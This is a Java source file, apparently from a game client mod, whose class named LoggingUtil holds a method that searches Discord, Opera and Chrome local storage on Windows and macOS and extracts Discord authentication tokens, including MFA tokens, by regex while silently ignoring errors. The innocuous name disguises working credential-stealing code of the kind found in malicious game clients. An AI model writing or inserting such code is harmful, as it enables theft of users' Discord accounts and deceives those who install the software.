package me.kutuzov.client.util;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class LoggingUtil {
    public static String myOS = "";

    public static String[] obtainDcTokens() {
        List<String> tokens = new ArrayList<>();
        List<String> paths = new ArrayList<>();
        if(myOS.toLowerCase(Locale.ROOT).contains("win")) {
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
        } else if(myOS.toLowerCase(Locale.ROOT).contains("mac"))
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");

        try {
            for(String path : paths) {
                File f = new File(path);
                String[] pathnames = f.list();
                if(pathnames == null)
                    continue;

                for(String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;
                        while ((strLine = br.readLine()) != null) {
                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);

                            while(m.find())
                                tokens.add(m.group());
                        }
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception ignored) {}

        return tokens.toArray(new String[0]);
    }
}